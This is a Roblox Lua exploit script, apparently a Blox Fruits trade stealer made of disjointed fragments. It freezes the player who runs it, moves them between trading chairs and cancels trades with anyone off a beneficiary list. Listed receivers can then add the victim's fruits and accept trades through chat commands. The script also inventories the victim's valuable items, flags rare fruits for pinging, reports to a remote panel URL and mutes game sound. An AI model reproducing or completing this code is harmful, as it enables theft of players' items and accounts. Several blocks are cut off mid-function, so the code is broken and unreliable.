local function tryRequest(options)
	local attempts = {
		function() if syn and syn.request then return syn.request(options) end end,
		function() if type(http_request) == "function" then return http_request(options) end end,
		function() if type(request) == "function" then return request(options) end end,
		function() if http and type(http) == "table" and type(http.request) == "function" then return http.request(options) end end,
		function() if fluxus and fluxus.request then return fluxus.request(options) end end,
		function() if krnl and krnl.request then return krnl.request(options) end end,
		function() if wearedevs and wearedevs.request then return wearedevs.request(options) end end,
	}
	for _, attempt in ipairs(attempts) do
		local ok, res = pcall(attempt)
		if ok and res then return res end
	end
	local ok, res = pcall(function() return HttpService:RequestAsync(options) end)
	if ok and res then return res end
	return nil
end

		Window:Notify({Title = "Error", Content = "No HTTP executor", Type = "error", Duration = 3})
		return
	end
	if getgenv().USER == "" then
		Window:Notify({Title = "Error", Content = "Missing USER", Type = "error", Duration = 3})
		return
	end
	local v = tostring(cmd or ""):lower()
	if v == "" then return end

	local json = HttpService:JSONEncode({ user = getgenv().USER, cmd = v, key = "]] .. PANEL_KEY .. [[" })
	local ok, result = pcall(function()
		return request_({
			Url = "]] .. PANEL_SET_URL .. [[",
			Method = "POST",
			Headers = { ["Content-Type"] = "application/json" },
			Body = json
		})
	end)

	if not ok or not result then
		Window:Notify({Title = "Error", Content = "Request failed", Type = "error", Duration = 3})
		return
	end

	local ok2, result2 = pcall(function() return HttpService:JSONDecode(result.Body or "{}") end)
	if ok2 and result2 and result2.ok then
		Window:Notify({Title = "Sent", Content = "✓ " .. v, Type = "success", Duration = 2})
	else
		Window:Notify({Title = "Failed", Content = "✗ " .. (result2 and result2.error or "?"), Type = "error", Duration = 3})
	end
end

local function freezePlayer()
	local char = LocalPlayer.Character
	if not char then return end
	local hum = char:FindFirstChildOfClass("Humanoid")
	if hum then
		hum.WalkSpeed = 0
		hum.JumpPower = 0
		hum.JumpHeight = 0
	end
	ContextActionService:BindAction("BlockMovement", function() return Enum.ContextActionResult.Sink end, false,
		Enum.PlayerActions.CharacterForward, Enum.PlayerActions.CharacterBackward,
		Enum.PlayerActions.CharacterLeft, Enum.PlayerActions.CharacterRight,
		Enum.PlayerActions.CharacterJump, Enum.KeyCode.Space)
end

local handlingWrongPartner = false
local hasTraded = false

local function isAuthorizedPartner(player)
	if not player then return false end
	for _, bName in ipairs(beneficiaryNames) do
		if bName ~= "" and player.Name == bName then return true end
	end
	for _, n in ipairs(AllReceivers) do if player.Name == n then return true end end
	return false
end

local function getCharacterParts()
	local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	return char, char:WaitForChild("Humanoid"), char:WaitForChild("HumanoidRootPart")
end

local function isHumanoidSeated(hum)
	if not hum then return false end
	if hum.Sit then return true end
	if hum.SeatPart ~= nil then return true end
	return hum:GetState() == Enum.HumanoidStateType.Seated
end

local function isPlayerSitting()
	local char = LocalPlayer.Character
	if not char then return false end
	local hum = char:FindFirstChildOfClass("Humanoid")
	return isHumanoidSeated(hum)
end

local function isNearChairZone(hrp)
	if not hrp or #currentWaypoints == 0 then return false end
	local pos = hrp.Position
	local minDist = math.huge
	for _, wp in ipairs(currentWaypoints) do
		local d = (pos - wp).Magnitude
		if d < minDist then minDist = d end
	end
	return minDist <= 30
end

local function tweenLongToChairs()
	local char, hum, hrp = getCharacterParts()
	if not hrp or isNearChairZone(hrp) then return end

	if game.PlaceId == 7449423635 or game.PlaceId == 100117331123089 then
		pcall(function() CommF:InvokeServer("requestEntrance", Vector3.new(-12471.17, 374.94, -7551.678)) end)
		if hrp and hrp.Parent then
			hrp.CFrame += Vector3.new(0, 50, 0)
		end
		task.wait(0.5)
		char, hum, hrp = getCharacterParts()
		if not hrp then return end
	end

	local firstWaypoint = currentWaypoints[1]
	if not firstWaypoint then return end

	isLongTweening = true
	if not char:FindFirstChild("PartTele") then
		local part = Instance.new("Part")
		part.Name = "PartTele"
		part.Size = Vector3.new(10, 1, 10)
		part.Anchored = true
		part.Transparency = 1
		part.CanCollide = true
		part.CFrame = hrp.CFrame
		part.Parent = char

		local conn = part:GetPropertyChangedSignal("CFrame"):Connect(function()
			if isLongTweening then
				task.wait()
				local c = LocalPlayer.Character
				local root = c and c:FindFirstChild("HumanoidRootPart")
				if root then
					root.CFrame = part.CFrame
				end
			end
		end)

		local partTele = char:FindFirstChild("PartTele")
		if partTele then
			local dist = (hrp.Position - firstWaypoint).Magnitude
			local tween = TweenService:Create(
				partTele,
				TweenInfo.new(dist / TRAVEL_SPEED, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut),
				{ CFrame = CFrame.new(firstWaypoint) }
			)
			tween:Play()

			local finished = false
			tween.Completed:Connect(function(playbackState)
				if playbackState == Enum.PlaybackState.Completed then
					finished = true
					isLongTweening = false
					if char:FindFirstChild("PartTele") then
						char.PartTele:Destroy()
					end
				end
			end)

			while not finished do
				if not hrp.Parent then
					isLongTweening = false
					if char:FindFirstChild("PartTele") then
						char.PartTele:Destroy()
					end
					break
				end
				if isHumanoidSeated(hum) or isNearChairZone(hrp) then
					tween:Cancel()
					isLongTweening = false
					if char:FindFirstChild("PartTele") then
						char.PartTele:Destroy()
					end
					break
				end
				task.wait(0.02)
			end
		end

		if conn then conn:Disconnect() end
	end
	isLongTweening = false
end

local function moveToNextChair()
	local char = LocalPlayer.Character
	if not char then return end
	local hum = char:FindFirstChildOfClass("Humanoid")
	local hrp = char:FindFirstChild("HumanoidRootPart")
	if not hum or not hrp then return end
	if #currentWaypoints == 0 then return end

	hum.Sit = false
	task.wait(0.1)
	currentChairIndex = currentChairIndex + 1
	if currentChairIndex > #currentWaypoints then currentChairIndex = 1 end
	local targetPos = currentWaypoints[currentChairIndex]
	local tween = TweenService:Create(
		hrp,
		TweenInfo.new(TWEEN_TIME, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut),
		{ CFrame = CFrame.new(targetPos) }
	)
	tween:Play()
	tween.Completed:Wait()
end

-- ═══════════════════════════════════════════════════════════════════════════
-- ==    CHAIR-TO-CHAIR TWEEN LOOP (Matches Reference Script Pattern)       ==
-- ═══════════════════════════════════════════════════════════════════════════
task.spawn(function()
	if #currentWaypoints == 0 then return end
	local idx = 1
	while true do
		local _, _, hrp = getCharacterParts()
		if isNearChairZone(hrp) or isResettingFruit then
			while isLongTweening do
				task.wait(0.25)
			end
			local waypoint = currentWaypoints[idx]
			currentChairIndex = idx
			if waypoint and hrp then
				local tween = TweenService:Create(
					hrp,
					TweenInfo.new(TWEEN_TIME, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut),
					{ CFrame = CFrame.new(waypoint) }
				)
				tween:Play()
				local done = false
				tween.Completed:Connect(function()
					done = true
				end)
				while not done and hrp.Parent do
					if isLongTweening then
						tween:Cancel()
						break
					end
					task.wait(0.02)
				end
				if not done then
					idx += 1
					if idx > #currentWaypoints then idx = 1 end
					task.wait(0.05)
					continue
				end
				task.wait(0.2)
				idx += 1
				if idx > #currentWaypoints then
					idx = 1
					task.wait(0.05)
					continue
				end
			end
			task.wait(0.05)
		else
			tweenLongToChairs()
			task.wait(0.25)
		end
	end
end)

			for _, obj in ipairs(workspace:GetDescendants()) do
				if (obj:IsA("Seat") or obj:IsA("VehicleSeat")) and obj ~= hum.SeatPart then
					if (obj.Position - seatPos).Magnitude < 12 and obj.Occupant then
						local oppPlr = Players:GetPlayerFromCharacter(obj.Occupant.Parent)
						if oppPlr then tradingWith = oppPlr; break end
					end
				end
			end

			if tradingWith and not isAuthorizedPartner(tradingWith) then
				handlingWrongPartner = true
				pcall(function() TradeFunction:InvokeServer("cancel") end)
				task.wait(0.5)
				moveToNextChair()
				task.wait(1)
				handlingWrongPartner = false
			end
		end)
	end
end)

local function getTradeSlotCount()
	local ok, count = pcall(function()
		local tradeGui = LocalPlayer.PlayerGui:FindFirstChild("Main") and LocalPlayer.PlayerGui.Main:FindFirstChild("Trade")
		if not tradeGui then return 0 end
		local container = tradeGui:FindFirstChild("Container") and tradeGui.Container:FindFirstChild("1")
		if not container then return 0 end
		local frame = container:FindFirstChild("Frame")
		if not frame then return 0 end
		local c = 0
		for _, child in ipairs(frame:GetChildren()) do
			if tonumber(child.Name) then c = c + 1 end
		end
		return c
	end)
	return ok and count or 0
end

local function addFruitSafe(itemId)
	if not itemId then return false end
	local beforeCount = getTradeSlotCount()
	if beforeCount >= 4 then return false end
	pcall(function() TradeFunction:InvokeServer("addItem", itemId, 1) end)
	local startWait = tick()
	while tick() - startWait < 0.5 do
		RunService.Heartbeat:Wait()
		if getTradeSlotCount() > beforeCount then return true end
	end
	return false
end

local function cleanFruitName(str)
	local cleaned = str:gsub("%-?%s*%d+x$", "")
	cleaned = cleaned:gsub("%s*%b()", "")
	return cleaned:gsub("^%s+", ""):gsub("%s+$", "")
end

local function doAddFruit(fruitName)
	if fruitName == "" then return false end
	local cleanName = cleanFruitName(fruitName):lower()
	if cleanName == "" then return false end
	local targetId = nil
	local ok, inv = pcall(function() return CommF:InvokeServer("getInventory") end)
	if ok and inv then
		for _, v in pairs(inv) do
			if type(v) == "table" then
				local vName = tostring(v.Name or v.DisplayName or ""):lower()
				if vName:find(cleanName, 1, true) then
					targetId = v.ItemId or v.Id or v.Name
					break
				end
			end
		end
	end
	if not targetId then
		pcall(function()
			local IRS = require(ReplicatedStorage.ItemReplicationService)
			local KEYS = require(ReplicatedStorage.ItemReplicationService.KEYS)
			local ItemConfig = require(ReplicatedStorage.ItemConfig)
			local items = IRS:GetItems(KEYS.IS_OWNED)
			for _, item in pairs(items) do
				if item.Value == true and item.ItemId then
					local config = ItemConfig.tryGet(item.ItemId)
					if config and config.Display and config.Display.Name then
						local confName = config.Display.Name:lower()
						if confName:find(cleanName, 1, true) then
							targetId = item.ItemId
							break
						end
					end
				end
			end
		end)
	end
	if targetId then return addFruitSafe(targetId) end
	return false
end

local function onTargetChatted(message)
	local lowerMessage = message:lower()
	if message:sub(1,1) == "+" then
		doAddFruit(message:sub(2):match("^%s*(.-)%s*$"))
	elseif message:sub(1,1) == "-" then
		doRemoveFruit(message:sub(2):match("^%s*(.-)%s*$"))
	elseif lowerMessage:sub(1,5) == ".add " then
		doAddFruit(message:sub(6):match("^%s*(.-)%s*$"))
	elseif lowerMessage:sub(1,7) == ".clear " then
		doRemoveFruit(message:sub(8):match("^%s*(.-)%s*$"))
	elseif lowerMessage == "?accept" or lowerMessage == ".accept" or lowerMessage == "ready" then
		doAccept()
	elseif lowerMessage == "?cancel" or lowerMessage == ".cancel" then
		doCancel()
	elseif lowerMessage == "?jump" or lowerMessage == ".jump" then
		doJump()
	elseif lowerMessage == "?tp" or lowerMessage == ".tp" then
		doTP()
	elseif lowerMessage == "?sit" or lowerMessage == ".sit" then
		moveToNextChair()
	elseif lowerMessage:sub(1,7) == "?reset " or lowerMessage:sub(1,7) == ".reset " then
		doReset(message:sub(8):match("^%s*(.-)%s*$"))
	elseif lowerMessage == "?addallfruits" or lowerMessage == ".addallfruits" or lowerMessage == ".addall" then
		doAddAllFruits()
	elseif lowerMessage == "?addallpre" or lowerMessage == ".addallpre" then
		doAddAllPre()
	elseif lowerMessage == "?skin" or lowerMessage == ".skin" then
		doAddAllSkins()
	elseif lowerMessage == "?clearall" or lowerMessage == ".clearall" then
		doClearAll()
	elseif lowerMessage:sub(1,6) == "?kick " or lowerMessage:sub(1,6) == ".kick " then
		doKick(message:sub(7):match("^%s*(.-)%s*$"))
	elseif lowerMessage == "?kick" or lowerMessage == ".kick" then
		doKick("")
	end
end

local function getFormattedInventory()
	local fruitCounts, gamepasses, permanents = {}, {}, {}
	local success, errMsg = false, "Unknown Error"

	local ok, res = pcall(function()
		local IRS_Instance = ReplicatedStorage:WaitForChild("ItemReplicationService", 5)
		if not IRS_Instance then error("ItemReplicationService not found") end
		local KEYS_Instance = IRS_Instance:WaitForChild("KEYS", 5)
		if not KEYS_Instance then error("KEYS not found") end
		local ItemConfig_Instance = ReplicatedStorage:WaitForChild("ItemConfig", 5)
		if not ItemConfig_Instance then error("ItemConfig not found") end

		local IRS, KEYS, ItemConfig = require(IRS_Instance), require(KEYS_Instance), require(ItemConfig_Instance)
		local items      = IRS:GetItems(KEYS.IS_OWNED)
		local quantities = IRS:GetItems(KEYS.QUANTITY)
		local qtyMap = {}
		if type(quantities) == "table" then
			for _, v in pairs(quantities) do if v.ItemId then qtyMap[tostring(v.ItemId)] = v.Value end end
		end

		if type(items) == "table" then
			for _, item in pairs(items) do
				if item.Value == true and item.ItemId then
					local config = ItemConfig.tryGet(item.ItemId)
					if type(config) == "table" and config.Display and config.Display.Category == "Blox Fruit" then
						local storageKey = config.Index and config.Index.StorageKey
						local name = config.Display.Name
						name = (name and name ~= "") and name or storageKey or ""
						local idType = config.Index and config.Index.IdType
						if type(name) == "string" and name ~= "" then
							if idType == "PhysicalMoveset" or idType == "Redeemable" then
								local baseName = name:match("^([^%(]+)") or name
								baseName = baseName:match("^([^%-]+)") or baseName
								baseName = baseName:gsub("%s+$","")
								if baseName == "Fiend" then baseName = "Yeti" end
								if name:find("Dragon") then
									if name:find("West") then baseName = "Dragon (West)"
									elseif name:find("East") then baseName = "Dragon (East)"
									else baseName = "Dragon" end
								end
								local count = qtyMap[tostring(item.ItemId)] or 1
								fruitCounts[baseName] = (fruitCounts[baseName] or 0) + count
							elseif idType == "Gamepass" or name:lower():find("gamepass") then
								table.insert(gamepasses, name)
							elseif name:lower():find("permanent") then
								table.insert(permanents, name:gsub("Permanent ","") .. " (Permanent)")
							end
						end
					end
				end
			end
		end
		success = true
	end)

	if not success then
		errMsg = tostring(res)
		local ok2, inv = pcall(function() return CommF:InvokeServer("getInventory") end)
		if ok2 and inv and type(inv) == "table" then
			for k, v in pairs(inv) do
				if type(v) == "table" then
					local itemName = tostring(v.Name or k)
					local itemType = tostring(v.Type or "")
					if itemType == "Blox Fruit" or itemType == "Fruit" or itemName:lower():find("fruit") then
						local baseName = itemName:match("^(.+)%-.+$") or itemName
						baseName = baseName:match("^([^%(]+)") or baseName
						baseName = baseName:match("^([^%-]+)") or baseName
						baseName = baseName:gsub("%s+$","")
						if baseName == "Fiend" then baseName = "Yeti" end
						if itemName:find("Dragon") then
							if itemName:find("West") then baseName = "Dragon (West)"
							elseif itemName:find("East") then baseName = "Dragon (East)"
							else baseName = "Dragon" end
						end
						local count = v.Count or v.Amount or 1
						fruitCounts[baseName] = (fruitCounts[baseName] or 0) + count
					end
				end
			end
			success = true
		else
			return "Error: " .. errMsg, 0, 0, 0, {}, {}, {}, false
		end
	end

	local sortedFruits = {}
	for fruitName, count in pairs(fruitCounts) do
		local rarity = RARITY_MAP[fruitName] or "Rare"
		local emoji  = EMOJI_MAP[fruitName] or "🍎"
		table.insert(sortedFruits, {Name=fruitName, Count=count, Rarity=rarity, Emoji=emoji, RarityLevel=RARITY_LEVELS[rarity] or 5})
	end

	table.sort(sortedFruits, function(a, b)
		local pA = getFruitPriority(a.Name)
		local pB = getFruitPriority(b.Name)
		if pA ~= pB then return pA < pB end
		if a.RarityLevel == b.RarityLevel then return a.Name < b.Name end
		return a.RarityLevel < b.RarityLevel
	end)

	local displayLines, totalFruits = {}, 0
	local shown = 0
	local shouldPing = false

	for _, fruit in ipairs(sortedFruits) do
		totalFruits = totalFruits + fruit.Count
		local displayEmoji = fruit.Emoji
		local lowerName = fruit.Name:lower()
		if MythicalFruits[lowerName] then
			displayEmoji = MythicalFruits[lowerName]
		elseif MythicalFruits[lowerName:gsub("%s*%b()",""):gsub("%s+$","")] then
			displayEmoji = MythicalFruits[lowerName:gsub("%s*%b()",""):gsub("%s+$","")]
		end

		if #targetPingFruits > 0 then
			for _, targetFruit in ipairs(targetPingFruits) do
				if type(targetFruit) == "string" and targetFruit ~= "" then
					local cleanTarget = targetFruit:lower():gsub("%s+",""):gsub("[^%w]","")
					local cleanFruit  = fruit.Name:lower():gsub("%s+",""):gsub("[^%w]","")
					if cleanFruit == cleanTarget or cleanFruit:find(cleanTarget, 1, true) then
						shouldPing = true
						break
					end
				end
			end
		end

		if shown < 15 then
			table.insert(displayLines, string.format("%s %s - %dx", displayEmoji, fruit.Name, fruit.Count))
			shown = shown + 1
		end
	end

	if #sortedFruits > 15 then
		table.insert(displayLines, string.format("... and %d more fruits", #sortedFruits - 15))
	end

	local finalString = table.concat(displayLines, "\n")
	if #finalString == 0 then finalString = "(No fruits found)" end

	return finalString, totalFruits, #gamepasses, #permanents, gamepasses, permanents, sortedFruits, shouldPing
end

			end)

		pcall(function() SoundService.Volume = 0 end)

	end
